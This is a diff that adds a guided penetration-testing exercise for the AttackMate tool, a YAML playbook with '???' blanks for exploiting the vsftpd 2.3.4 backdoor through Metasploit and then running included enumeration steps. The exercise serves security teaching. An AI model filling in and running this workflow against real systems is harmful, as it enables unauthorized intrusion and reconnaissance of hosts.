@@ -1,0 +1,69 @@
+#
+# Exercise 4: Modular Playbooks with Include Guided Version
+#
+# Instructions:
+#     Each command skeleton is already in place.
+#     Replace every "???" placeholder with the correct value.
+#     Run with: attackmate --config ../config.yml exercise_04_include_refactor_guided.yml
+#
+# Step 1: exercises/includes/gather_commands.yml already exists.
+#     It expects a variable $GATHER_SESSION with a Metasploit session ID.
+#     It runs: checkvm, enum_network, enum_users_history.
+#
+# Step 2: Fill in the TODOs below.
+#
+# Prerequisites: msfrpcd -P msf -a 127.0.0.1
+#
+
+vars:
+  # TODO: Replace with your actual IPs
+  TARGET: CHANGE_ME
+  ATTACKER: CHANGE_ME_ATTACKER
+  INCLUDE_PATH: ./includes
+
+commands:
+  # ============================================
+  # PHASE 1: Exploitation
+  # ============================================
+
+  # TODO 1: Replace each "???":
+  #   - cmd: the vsftpd 2.3.4 backdoor module path (same as exercise 01)
+  #   - payload: cmd/unix/interact
+  #   - options RHOSTS: target IP variable
+  #   - options RPORT: FTP port number
+  #   - creates_session: "shell"
+  - type: msf-module
+    cmd: "???"
+    payload: "???"
+    options:
+      RHOSTS: "???"
+      RPORT: "???"
+    creates_session: "???"
+
+  # TODO 2: Replace "???" with the command to verify shell access
+  - type: msf-session
+    session: shell
+    cmd: "???"
+
+  - type: debug
+    cmd: "Shell identity: $RESULT_STDOUT"
+
+  # ============================================
+  # PHASE 2: Prepare Include Variables
+  # ============================================
+
+  # TODO 3: Replace each "???":
+  #   - variable: the name gather_commands.yml expects (GATHER_SESSION)
+  #   - cmd: the builtin that holds the last MSF session ID
+  - type: setvar
+    variable: "???"
+    cmd: "???"
+
+  # ============================================
+  # PHASE 3: Include Post-Exploitation
+  # ============================================
+
+  # TODO 4: Replace "???" with the path to gather_commands.yml
+  # Hint: use $INCLUDE_PATH and the filename
+  - type: include
+    local_path: "???"
